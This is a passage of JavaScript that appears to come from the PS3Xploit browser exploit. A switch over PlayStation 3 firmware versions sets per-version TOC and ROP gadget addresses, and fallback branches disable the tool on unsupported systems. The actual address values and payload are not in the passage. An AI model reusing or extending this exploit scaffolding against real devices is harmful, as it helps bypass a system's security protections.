				case fwCompat[20]:
					alert(msgCongrats);
					toc_addr = toc_addr_476;
					gadget1_addr=gadget1_addr_476;
					gadget2_addr=gadget2_addr_476;
					gadget3_addr=gadget3_addr_476;
					gadget4_addr=gadget4_addr_476;
					gadget5_addr=gadget5_addr_476;
					gadget6_addr=gadget6_addr_476;
					gadget7_addr=gadget7_addr_476;
					gadget8_addr=gadget8_addr_476;
					break;
					
				case fwCompat[21]:
					alert(msgCongrats);
					toc_addr = toc_addr_478;
					gadget1_addr=gadget1_addr_478;
					gadget2_addr=gadget2_addr_478;
					gadget3_addr=gadget3_addr_478;
					gadget4_addr=gadget4_addr_478;
					gadget5_addr=gadget5_addr_478;
					gadget6_addr=gadget6_addr_478;
					gadget7_addr=gadget7_addr_478;
					gadget8_addr=gadget8_addr_478;
					break;
					
				case fwCompat[22]:
					alert(msgCongrats);
					toc_addr = toc_addr_480;
					gadget1_addr=gadget1_addr_480;
					gadget2_addr=gadget2_addr_480;
					gadget3_addr=gadget3_addr_480;
					gadget4_addr=gadget4_addr_480;
					gadget5_addr=gadget5_addr_480;
					gadget6_addr=gadget6_addr_480;
					gadget7_addr=gadget7_addr_480;
					gadget8_addr=gadget8_addr_480;
					break;
				case fwCompat[23]:
					alert(msgCongrats);
					initDEX();
					toc_addr = toc_addr_481;
					gadget1_addr=gadget1_addr_481;
					gadget2_addr=gadget2_addr_481;
					gadget3_addr=gadget3_addr_481;
					gadget4_addr=gadget4_addr_481;
					gadget5_addr=gadget5_addr_481;
					gadget6_addr=gadget6_addr_481;
					gadget7_addr=gadget7_addr_481;
					gadget8_addr=gadget8_addr_481;
					break;
					
				case fwCompat[24]:
					alert(msgCongrats);
					toc_addr = toc_addr_482;
					gadget1_addr=gadget1_addr_482;
					gadget2_addr=gadget2_addr_482;
					gadget3_addr=gadget3_addr_482;
					gadget4_addr=gadget4_addr_482;
					gadget5_addr=gadget5_addr_482;
					gadget6_addr=gadget6_addr_482;
					gadget7_addr=gadget7_addr_482;
					gadget8_addr=gadget8_addr_482;
					break;
					
				default:
					alert("Your PS3 is not on FW 4.81 or 4.82! Your current running FW version is " + fwVersion + ", which is not compatible with PS3Xploit. All features have been disabled");
					disable_btn();
					disable_cb();
					break;
			}
			break;
		
		default:
			alert("You are not on a PlayStation System! All features have been disabled");
			disable_btn();
			disable_cb();
			break;
	}
}